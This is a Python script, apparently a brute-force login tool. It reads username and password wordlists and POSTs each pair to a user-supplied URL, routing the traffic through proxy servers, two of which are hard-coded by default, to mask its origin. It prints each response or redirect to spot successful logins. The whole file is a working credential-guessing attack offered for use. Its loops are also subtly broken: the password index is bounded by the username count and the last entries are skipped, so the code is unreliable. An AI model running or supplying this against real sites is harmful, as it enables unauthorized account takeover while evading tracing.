# import modules{
    #requests module to make requests with proxies
import requests
import time
# declare variables 
admin_el = []
psd = []
i = 0
j=0
# URL
a_url = input("Testing URL:" )
if 'y' in input('Use default proxy servers (y/n): ') :
    proxies = {
    "http": "43.239.155.130:32650",
    "https": "186.159.6.163:1994"
    }
else:
    http_proxy = input(' HTTP proxy address : ')
    https_proxy = input('HTTPS proxy address : ')
    proxies = {
            "http": http_proxy,
            "https":https_proxy
    }
# }

admin_list_file = input("Admin list path: ")
with open(admin_list_file,'r') as admin_list_file :
    for line in admin_list_file:
        admin_el.append(line.strip())
password_list_file = input("Password list path: ")
with open(password_list_file, 'r') as f:
    for line in f:
        psd.append(line.strip())

while i < len(admin_el)-1:
    k = 0
    while k < len(admin_el)-1:
        params = {
        'user_name': admin_el[i],
        'user_pass': psd[k]
       }
        print("Trying :"+admin_el[i]+" with password "+psd[k])
        response = requests.post(a_url, params=params,proxies=proxies, allow_redirects=True)
        if response.status_code == 200:
             print('REQUEST-POSTED !\n === The fetched response is: \n')
             print(response.content)
        elif response.status_code == 301 or response.status_code == 302:
             print('Redirection detected! \n === The fetched response is: \n')
             print(response.headers['Location'])
        else:
             print('Error while sending request! \n === Details of Failure === \n')
             print(response.status_code)
        time.sleep(1)
        k = k+1
    i = i+1
    